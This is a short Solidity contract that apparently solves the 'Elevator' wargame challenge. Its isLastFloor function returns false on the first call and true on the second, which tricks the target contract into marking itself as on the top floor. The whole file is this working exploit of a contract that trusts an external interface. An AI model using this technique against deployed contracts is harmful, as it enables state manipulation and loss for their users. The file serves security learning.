
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Building, Elevator} from "./Elevator.sol";

contract ElevatorHacker is Building{
  bool public first = true;

  function hack(address _elevator) public {
    Elevator elevator = Elevator(_elevator);
    elevator.goTo(42);
  }

  function isLastFloor(uint256) external returns (bool) {
    if (first) {
      first = false;
      return false;
    } else {
      return true;
    }
  }
}